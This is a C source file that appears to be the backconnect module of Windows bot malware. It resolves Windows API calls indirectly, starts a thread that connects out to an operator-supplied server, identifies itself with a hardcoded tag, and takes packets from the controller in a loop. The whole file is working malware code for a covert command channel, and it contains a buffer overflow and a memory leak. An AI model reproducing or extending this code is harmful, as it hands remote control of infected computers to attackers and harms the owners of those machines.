#include "backconnect.h"

#ifdef MODULE_BACKCONNECT
#include <Winsock.h>
#include "../common/mem.h"
#include "../common/string.h"
#include "protocol.h"

extern bot_t bot;

static void _HandleReceivedBackconnectData(SOCKET hClient, const LPSTR pszData, int iAmount)
{
	char PacketType;
	LPSTR pszBuffer;

	if(iAmount <= 1)
		return;

	if((pszBuffer = memalloc(iAmount - 1)) == NULL)
		return;

	memcopy(pszBuffer, pszData + 1, iAmount - 1);
	
	PacketType = pszData[0];

	switch(PacketType)
	{
	case 0x1: /*Header*/
		HandleHeader(hClient, pszBuffer, iAmount - 1);
		break;
	case 0x2: /*Block*/
		HandleBlock(hClient, pszBuffer, iAmount - 1);
		break;
	default:break;
	}

}

static DWORD WINAPI Backconnect_Thread(backconnect_info_t* pBcInfo)
{
	WSADATA wsaData;
	SOCKET hClient;
	SOCKADDR_IN serverAddress;
	char szBuffer[3072];
	int iRead;

	if (CWA(WSAStartup)(MAKEWORD(2, 2), &wsaData) == 0)
	{
		if((hClient = CWA(socket)(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET)
		{
			memzero(&serverAddress, sizeof(SOCKADDR_IN));
			serverAddress.sin_family = AF_INET;
			serverAddress.sin_port = CWA(htons)(pBcInfo->iPort);
			serverAddress.sin_addr.S_un.S_addr = CWA(inet_addr)(pBcInfo->pszServerAddress);

			if(CWA(connect)(hClient, (struct sockaddr*)&serverAddress, sizeof(SOCKADDR_IN)) == 0)
			{
				SendPacket(hClient, IDENT, "bro");

				while(TRUE)
				{
					memzero(&szBuffer, sizeof(szBuffer));

					if((iRead = CWA(recv)(hClient, szBuffer, 3072, 0)) == 0)
						break;

					szBuffer[iRead] = 0;

					_HandleReceivedBackconnectData(hClient, szBuffer, iRead);
				}

				CWA(closesocket)(hClient);
			}
		}
		CWA(WSACleanup)();
	}
	return 0;
}

BOOL WINAPI StartBackconnect(const LPSTR pszServerAddress, int iPort)
{
	HANDLE hThread;
	static backconnect_info_t bcInfo;
	memzero(&bcInfo, sizeof(backconnect_info_t));
	bcInfo.pszServerAddress = StrCopyA(pszServerAddress, StrLengthA(pszServerAddress));
	bcInfo.iPort = iPort;

	if ((hThread = bot.api.pCreateThread(NULL, 0, Backconnect_Thread, (LPVOID)&bcInfo, 0, NULL)) != 0)
	{
		bot.api.pCloseHandle(hThread);
		return TRUE;
	}

	memfree(bcInfo.pszServerAddress);

	return FALSE;
}
#endif